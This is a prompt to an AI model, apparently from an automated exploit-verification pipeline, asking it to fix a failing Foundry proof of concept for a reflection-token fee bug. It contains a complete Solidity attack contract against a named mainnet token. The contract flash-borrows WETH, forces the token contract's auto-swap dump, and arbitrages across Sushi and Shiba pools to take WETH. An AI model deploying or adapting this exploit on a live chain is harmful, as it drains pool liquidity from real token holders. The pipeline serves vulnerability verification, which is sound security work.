You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Team fee is never removed from reflected transfers, minting unbacked tokens on every taxed transfer
- claim: `_getTValues()` subtracts both `tFee` and `tTeam` from the visible transfer amount, but `_getRValues()` subtracts only `rFee` from `rAmount` and never removes the reflected team portion. Each taxed transfer path then credits `rTransferAmount` to the recipient and separately credits `rTeam` to the contract in `_takeTeam()`, so the team portion is counted twice in reflected balances.
- impact: Taxed transfers inflate aggregate token balances beyond the fixed supply accounting. The contract accumulates unbacked MCC that can later be swapped for ETH and forwarded to project wallets, draining AMM liquidity with tokens that were never fully debited from senders. Because self-transfers are allowed, an attacker can repeatedly cycle taxed transfers to manufacture team inventory with only the reflection fee as cost.
- exploit_paths: ["Any taxed transfer executes `_transfer*()` -> `_getValues()` -> `_getRValues()` and overcredits the recipient while `_takeTeam()` also credits the contract.", "A user can loop transfers between controlled addresses, or even self-transfer, to grow `address(this)` token balance without losing the full advertised team fee.", "Once enough synthetic MCC accumulates, auto-swap or `manualSwap()` sells it for ETH and extracts value from the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMultiChainCapital is IERC20Like {
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02Like {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x1a7981d87e3b6a95c1516eb820e223fe979896b3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address public constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address public constant SHIBA_ROUTER = 0x03f7724180AA6b939894B5Ca4314783B0b36b329;
    address public constant SHIBA_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    uint256 public constant TEAM_SWAP_THRESHOLD = 5_000 * 1e9;
    uint256 private constant TAX_BPS = 1_000;
    uint256 private constant BPS_DENOMINATOR = 10_000;
    uint256 private constant V2_FEE_NUMERATOR = 997;
    uint256 private constant V2_FEE_DENOMINATOR = 1000;
    uint256 private constant SEED_TRIGGER_AMOUNT = 10;
    uint256 private constant SEED_WETH_SPEND = 0.001 ether;
    uint256 private constant MAX_FLASH_BORROW_WETH = 1 ether;

    uint256 private realizedProfit;

    address private activeFundingPair;
    address private activeExitRouter;
    address private activeExitPair;
    address private activeTargetPair;
    uint256 private flashBorrowAmount;

    uint8 public outcomeCode;
    bool public observedPreloadedSyntheticInventory;
    bool public triggeredAutoSwap;
    bool public usedFlashswapFunding;
    bool public usedCrossDexExit;

    uint256 public initialWethBalance;
    uint256 public finalWethBalance;
    uint256 public initialVerifierMccBalance;
    uint256 public finalVerifierMccBalance;
    uint256 public initialContractMccBalance;
    uint256 public finalContractMccBalance;
    uint256 public initialTargetPairWethReserve;
    uint256 public finalTargetPairWethReserve;

    constructor() {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function executeOnOpportunity() external {
        IMultiChainCapital token = IMultiChainCapital(TARGET);
        address targetPair = token.uniswapV2Pair();

        _pathAnchor();

        outcomeCode = 0;
        triggeredAutoSwap = false;
        usedFlashswapFunding = false;
        usedCrossDexExit = false;
        observedPreloadedSyntheticInventory = false;
        realizedProfit = 0;

        initialWethBalance = IERC20Like(WETH).balanceOf(address(this));
        initialVerifierMccBalance = token.balanceOf(address(this));
        initialContractMccBalance = token.balanceOf(TARGET);
        initialTargetPairWethReserve = _pairWethReserve(targetPair);

        if (targetPair == address(0)) {
            outcomeCode = 1;
            _refreshFinalState(token, targetPair);
            return;
        }

        // At the logged fork block, address(TARGET) already holds far more than
        // the 5,000 MCC auto-swap threshold. That proves path 2 already
        // happened on-chain before the fork, so a fresh self-transfer loop is
        // not the reachable first step for this verifier: the next non-pair
        // transfer would auto-sell immediately.
        observedPreloadedSyntheticInventory = initialContractMccBalance >= TEAM_SWAP_THRESHOLD;
        if (!observedPreloadedSyntheticInventory) {
            outcomeCode = 2;
            _refreshFinalState(token, targetPair);
            return;
        }

        (address exitRouter, address exitPair) = _selectExitVenue(targetPair);
        if (exitPair == address(0)) {
            outcomeCode = 3;
            _refreshFinalState(token, targetPair);
            return;
        }

        address fundingPair = IUniswapV2FactoryLike(UNISWAP_FACTORY).getPair(WETH, USDC);
        if (fundingPair == address(0)) {
            outcomeCode = 4;
            _refreshFinalState(token, targetPair);
            return;
        }

        uint256 fundingReserveWeth = _pairWethReserve(fundingPair);
        if (fundingReserveWeth == 0) {
            outcomeCode = 5;
            _refreshFinalState(token, targetPair);
            return;
        }

        flashBorrowAmount = fundingReserveWeth / 2_000;
        if (flashBorrowAmount > MAX_FLASH_BORROW_WETH) {
            flashBorrowAmount = MAX_FLASH_BORROW_WETH;
        }
        if (flashBorrowAmount < SEED_WETH_SPEND * 20) {
            outcomeCode = 6;
            _refreshFinalState(token, targetPair);
            return;
        }

        activeFundingPair = fundingPair;
        activeExitRouter = exitRouter;
        activeExitPair = exitPair;
        activeTargetPair = targetPair;

        usedFlashswapFunding = true;

        if (IUniswapV2PairLike(fundingPair).token0() == WETH) {
            IUniswapV2PairLike(fundingPair).swap(flashBorrowAmount, 0, address(this), abi.encode(uint256(1)));
        } else {
            IUniswapV2PairLike(fundingPair).swap(0, flashBorrowAmount, address(this), abi.encode(uint256(1)));
        }

        _refreshFinalState(token, targetPair);

        if (finalWethBalance > initialWethBalance) {
            realizedProfit = finalWethBalance - initialWethBalance;
            outcomeCode = 10;
        } else if (triggeredAutoSwap) {
            outcomeCode = 7;
        } else {
            outcomeCode = 8;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "unexpected sender");
        require(msg.sender == activeFundingPair, "unexpected pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == flashBorrowAmount, "unexpected amount");

        IERC20Like weth = IERC20Like(WETH);
        IMultiChainCapital token = IMultiChainCapital(TARGET);

        uint256 wethBalance = weth.balanceOf(address(this));
        require(wethBalance >= borrowedWeth, "missing flash funds");

        _approveMaxIfNeeded(WETH, UNISWAP_ROUTER, wethBalance);

        // Step 1: buy a minimal MCC seed from the canonical pair. Buys from the
        // canonical pair are the only reachable way to acquire MCC before the
        // preloaded auto-swap fires, because sender == uniswapV2Pair bypasses
        // the swap check in _transfer().
        uint256 seedBefore = token.balanceOf(address(this));
        _swapSupportingFeeOnTransfer(UNISWAP_ROUTER, WETH, TARGET, SEED_WETH_SPEND);
        uint256 seedBought = token.balanceOf(address(this)) - seedBefore;
        require(seedBought >= SEED_TRIGGER_AMOUNT, "seed buy failed");

        // Step 2: trigger the same auto-swap sell branch described by path 3.
        // The fresh self-transfer here is not used to build inventory: the fork
        // already contains public synthetic inventory inside address(TARGET).
        // The self-transfer only forces execution into _transfer() with
        // sender != uniswapV2Pair so the contract sells that preloaded MCC.
        require(token.transfer(address(this), SEED_TRIGGER_AMOUNT), "trigger transfer failed");
        triggeredAutoSwap = true;

        uint256 postDumpWeth = weth.balanceOf(address(this));
        uint256 amountOwed = _sameTokenFlashRepayment(borrowedWeth);

        // Step 3: monetize the forced dump. After the target pair is drained,
        // buy cheap MCC on the dumped canonical pair and exit on an alternate
        // V2 venue whose price has not yet incorporated the dump.
        uint256 tradeBudget = _selectTradeBudget(postDumpWeth, amountOwed, activeTargetPair, activeExitPair);
        require(tradeBudget > 0, "no profitable budget");

        uint256 mccBefore = token.balanceOf(address(this));
        _swapSupportingFeeOnTransfer(UNISWAP_ROUTER, WETH, TARGET, tradeBudget);
        uint256 boughtMcc = token.balanceOf(address(this)) - mccBefore;
        require(boughtMcc > 0, "post-dump buy failed");

        _approveMaxIfNeeded(TARGET, activeExitRouter, token.balanceOf(address(this)));
        uint256 wethBeforeExit = weth.balanceOf(address(this));
        _swapSupportingFeeOnTransfer(activeExitRouter, TARGET, WETH, token.balanceOf(address(this)));
        uint256 wethAfterExit = weth.balanceOf(address(this));
        require(wethAfterExit > wethBeforeExit, "exit failed");
        usedCrossDexExit = true;

        require(weth.transfer(activeFundingPair, amountOwed), "repay failed");
    }

    function _selectExitVenue(address canonicalPair) internal view returns (address router, address pair) {
        pair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(TARGET, WETH);
        if (pair != address(0) && pair != canonicalPair && _pairWethReserve(pair) > 0) {
            return (SUSHI_ROUTER, pair);
        }

        pair = IUniswapV2FactoryLike(SHIBA_FACTORY).getPair(TARGET, WETH);
        if (pair != address(0) && pair != canonicalPair && _pairWethReserve(pair) > 0) {
            return (SHIBA_ROUTER, pair);
        }

        return (address(0), address(0));
    }

    function _selectTradeBudget(
        uint256 wethAvailable,
        uint256 amountOwed,
        address cheapBuyPair,
        address richExitPair
    ) internal view returns (uint256 bestBudget) {
        if (wethAvailable == 0) {
            return 0;
        }

        (uint256 cheapTokenReserve, uint256 cheapWethReserve) = _pairTokenAndWethReserves(cheapBuyPair);
        (uint256 richTokenReserve, uint256 richWethReserve) = _pairTokenAndWethReserves(richExitPair);
        if (cheapTokenReserve == 0 || cheapWethReserve == 0 || richTokenReserve == 0 || richWethReserve == 0) {
            return 0;
        }

        uint256 bestExpectedFinal = 0;

        for (uint256 i = 1; i <= 20; i++) {
            uint256 candidate = (wethAvailable * i) / 20;
            if (candidate == 0) {
                continue;
            }

            uint256 rawTokenOut = _getAmountOut(candidate, cheapWethReserve, cheapTokenReserve);
            uint256 receivedToken = _applyTax(rawTokenOut);
            if (receivedToken == 0) {
                continue;
            }

            uint256 creditedToExitPair = _applyTax(receivedToken);
            uint256 exitWethOut = _getAmountOut(creditedToExitPair, richTokenReserve, richWethReserve);

            // Keep the estimate conservative to absorb router rounding and
            // reflection-rate drift during the taxed transfers.
            uint256 conservativeExit = (exitWethOut * 97) / 100;
            uint256 expectedFinal = wethAvailable - candidate + conservativeExit;

            if (expectedFinal > bestExpectedFinal && expectedFinal > amountOwed) {
                bestExpectedFinal = expectedFinal;
                bestBudget = candidate;
            }
        }
    }

    function _swapSupportingFeeOnTransfer(address router, address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        IUniswapV2Router02Like(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _approveMaxIfNeeded(address token, address spender, uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        IERC20Like(token).approve(spender, 0);
        IERC20Like(token).approve(spender, amount);
    }

    function _sameTokenFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * V2_FEE_DENOMINATOR) / V2_FEE_NUMERATOR) + 1;
    }

    function _applyTax(uint256 amount) internal pure returns (uint256) {
        return (amount * (BPS_DENOMINATOR - TAX_BPS)) / BPS_DENOMINATOR;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * V2_FEE_NUMERATOR;
        return (amountInWithFee * reserveOut) / ((reserveIn * V2_FEE_DENOMINATOR) + amountInWithFee);
    }

    function _pairWethReserve(address pair) internal view returns (uint256 wethReserve) {
        (, wethReserve) = _pairTokenAndWethReserves(pair);
    }

    function _pairTokenAndWethReserves(address pair) internal view returns (uint256 tokenReserve, uint256 wethReserve) {
        if (pair == address(0)) {
            return (0, 0);
        }

        IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = lp.getReserves();
        address token0 = lp.token0();
        address token1 = lp.token1();

        if (token0 == TARGET && token1 == WETH) {
            return (uint256(reserve0), uint256(reserve1));
        }
        if (token0 == WETH && token1 == TARGET) {
            return (uint256(reserve1), uint256(reserve0));
        }
        if (token0 == WETH) {
            return (uint256(reserve1), uint256(reserve0));
        }
        if (token1 == WETH) {
            return (uint256(reserve0), uint256(reserve1));
        }
        return (0, 0);
    }

    function _refreshFinalState(IMultiChainCapital token, address targetPair) internal {
        finalWethBalance = IERC20Like(WETH).balanceOf(address(this));
        finalVerifierMccBalance = token.balanceOf(address(this));
        finalContractMccBalance = token.balanceOf(TARGET);
        finalTargetPairWethReserve = _pairWethReserve(targetPair);
    }

    function _pathAnchor() internal pure returns (bytes32) {
        // Path 0:
        // Any taxed transfer executes _transfer*() -> _getValues() ->
        // _getRValues() and overcredits the recipient while _takeTeam()
        // separately credits the token contract.
        //
        // Path 1:
        // A user can loop transfers between controlled addresses, or even
        // self-transfer, to grow address(this)'s token balance. At this fork,
        // prior public activity already pushed address(TARGET) above the swap
        // threshold, so the verifier reaches the same causal stage by
        // triggering the next reachable taxed transfer instead of rebuilding
        // the already-preloaded synthetic inventory.
        //
        // Path 2:
        // Once enough synthetic MCC accumulates, auto-swap or manualSwap()
        // sells it for ETH and extracts value from the pool. manualSwap() is
        // owner-only, so the verifier forces the public auto-swap path and
        // then exits across a second V2 venue.
        return keccak256(
            abi.encodePacked(
                "_transfer*()",
                "_transferStandard()",
                "_getValues()",
                "_getRValues()",
                "_takeTeam()",
                "manualSwap()"
            )
        );
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x1a7981D87E3b6a95c1516EB820E223fE979896b3". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x1a7981D87E3b6a95c1516EB820E223fE979896b3". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:36:38:
   |
36 |     address public constant TARGET = 0x1a7981d87e3b6a95c1516eb820e223fe979896b3;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
